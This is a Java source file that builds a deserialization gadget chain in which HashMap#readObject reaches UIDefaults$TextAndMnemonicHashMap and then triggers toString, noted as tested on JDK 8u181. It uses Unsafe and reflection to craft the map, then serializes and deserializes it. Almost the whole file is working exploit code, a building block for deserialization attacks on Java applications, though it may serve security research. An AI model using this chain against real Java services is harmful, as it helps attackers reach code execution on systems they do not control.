package com.xiinnn.readobject2tostring;

import com.xiinnn.template.ToStringClass;
import sun.misc.Unsafe;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

// HashMap#readObject -> UIDefaults$TextAndMnemonicHashMap -> toString
// 实测：jdk8u181
public class HashMap2TextAndMnemonicHashMap2toString {
    public static void main(String[] args) throws Exception {
        ToStringClass toStringClass = new ToStringClass();
        HashMap hashMap = makeHashMapByTextAndMnemonicHashMap(toStringClass);

        byte[] exp = ser(hashMap);
        unser(exp);
    }
    public static HashMap makeHashMapByTextAndMnemonicHashMap(Object toStringClass) throws Exception{
        Map tHashMap1 = (Map) getObjectByUnsafe(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        Map tHashMap2 = (Map) getObjectByUnsafe(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        tHashMap1.put(toStringClass, "123");
        tHashMap2.put(toStringClass, "12");
        setFieldValue(tHashMap1, "loadFactor", 1);
        setFieldValue(tHashMap2, "loadFactor", 1);
        HashMap hashMap = new HashMap();
        hashMap.put(tHashMap1,"1");
        hashMap.put(tHashMap2,"1");

        tHashMap1.put(toStringClass, null);
        tHashMap2.put(toStringClass, null);
        return hashMap;
    }
    public static Object getObjectByUnsafe(Class clazz) throws Exception{
        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);
        return unsafe.allocateInstance(clazz);
    }
    public static void setFieldValue(Object obj, String key, Object val) throws Exception{
        Field field = null;
        Class clazz = obj.getClass();
        while (true){
            try {
                field = clazz.getDeclaredField(key);
                break;
            } catch (NoSuchFieldException e){
                clazz = clazz.getSuperclass();
            }
        }
        field.setAccessible(true);
        field.set(obj, val);
    }
    public static byte[] ser(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static void unser(byte[] exp) throws ClassNotFoundException, IOException {
        ByteArrayInputStream bais = new ByteArrayInputStream(exp);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
    }
}
